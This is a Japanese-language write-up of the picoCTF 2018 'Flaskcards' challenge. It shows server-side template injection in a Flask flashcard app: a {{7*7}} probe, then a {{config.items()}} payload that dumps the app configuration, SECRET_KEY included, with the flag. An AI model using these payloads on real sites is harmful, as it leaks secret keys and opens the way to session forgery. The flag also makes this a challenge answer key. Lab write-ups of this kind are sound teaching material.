# Flaskcards

## Solve
```
We found this fishy [website](http://2018shell.picoctf.com:23547/) for flashcards that we think may be sending secrets. 
Could you take a look?
```

## Hint
```
Are there any common vulnerabilities with the backend of the website?
Is there anywhere that filtering doesn't get applied?
The database gets reverted every 2 hours so your session might end unexpectedly. Just make another user
```

<br>

## Solution

![1](https://user-images.githubusercontent.com/47602064/83619902-7815f000-a5c7-11ea-9df3-15f75572e152.png)

問題のページに移動するとloginがあるサイトが表示されました。

問題のタイトルにもある「Flask」などのテンプレートエンジンにはサーバーサイドテンプレートインジェクション（SSTI）という脆弱性があります。

まず始めにアカウントを適当に作ってみます。

作ったのでloginすると以下のように出来ます。

![2](https://user-images.githubusercontent.com/47602064/83622250-ab0db300-a5ca-11ea-93b3-cf47754b776b.png)

そしたらメニュー選択で`Create a Card`というページがあります。

どうやら自分で問題を作ってリストで保存できるそうです。

ここに`SSTI`が使えそうとわかります。

<br>

試しに`{{7*7}}`とQuestionに入力して作ってみます。

![3](https://user-images.githubusercontent.com/47602064/83622660-3edf7f00-a5cb-11ea-838c-0fec36c1275c.png)

作成できたら`List Cards`で見てみます。

![4](https://user-images.githubusercontent.com/47602064/83622806-70f0e100-a5cb-11ea-8ebc-004d219ce59f.png)

すると`{{7*7}}`と入力した`Question`が`49`と表示されるので`SSTI`が出来ていることがわかります。

なので以下を入力して作成してみます。

`{{config.items()}}`

すると`List of Cards`に`config`の中身が表示されてflagも一緒に表示されました。

![5](https://user-images.githubusercontent.com/47602064/83623495-5d924580-a5cc-11ea-8399-e8286d0094c9.png)

```txt
Question:dict_items([('JSONIFY_MIMETYPE', 'application/json'), ('TESTING', False), ('BOOTSTRAP_LOCAL_SUBDOMAIN', None), ('SQLALCHEMY_ECHO', False), ('BOOTSTRAP_CDN_FORCE_SSL', False), ('SESSION_COOKIE_PATH', None), ('SQLALCHEMY_DATABASE_URI', 'sqlite://'), ('SERVER_NAME', None), ('EXPLAIN_TEMPLATE_LOADING', False), ('TRAP_BAD_REQUEST_ERRORS', None), ('USE_X_SENDFILE', False), ('JSON_AS_ASCII', True), ('TEMPLATES_AUTO_RELOAD', None), ('DEBUG', False), ('SQLALCHEMY_TRACK_MODIFICATIONS', False), ('SQLALCHEMY_NATIVE_UNICODE', None), ('SQLALCHEMY_MAX_OVERFLOW', None), ('SQLALCHEMY_POOL_SIZE', None), ('ENV', 'production'), ('SESSION_COOKIE_NAME', 'session'), ('SECRET_KEY', 'picoCTF{secret_keys_to_the_kingdom_584f8327}'), ('APPLICATION_ROOT', '/'), ('SESSION_REFRESH_EACH_REQUEST', True), ('SQLALCHEMY_POOL_TIMEOUT', None), ('SQLALCHEMY_RECORD_QUERIES', None), ('BOOTSTRAP_USE_MINIFIED', True), ('SQLALCHEMY_POOL_RECYCLE', None), ('MAX_COOKIE_SIZE', 4093), ('SESSION_COOKIE_DOMAIN', False), ('SQLALCHEMY_COMMIT_ON_TEARDOWN', False), ('PRESERVE_CONTEXT_ON_EXCEPTION', None), ('SESSION_COOKIE_SAMESITE', None), ('BOOTSTRAP_QUERYSTRING_REVVING', True), ('SQLALCHEMY_BINDS', None), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(31)), ('TRAP_HTTP_EXCEPTIONS', False), ('MAX_CONTENT_LENGTH', None), ('PROPAGATE_EXCEPTIONS', None), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_HTTPONLY', True), ('JSON_SORT_KEYS', True), ('PREFERRED_URL_SCHEME', 'http'), ('JSONIFY_PRETTYPRINT_REGULAR', False), ('BOOTSTRAP_SERVE_LOCAL', False), ('SEND_FILE_MAX_AGE_DEFAULT', datetime.timedelta(0, 43200))]) 
```

<br><br>

## FLAG: picoCTF{secret_keys_to_the_kingdom_584f8327}
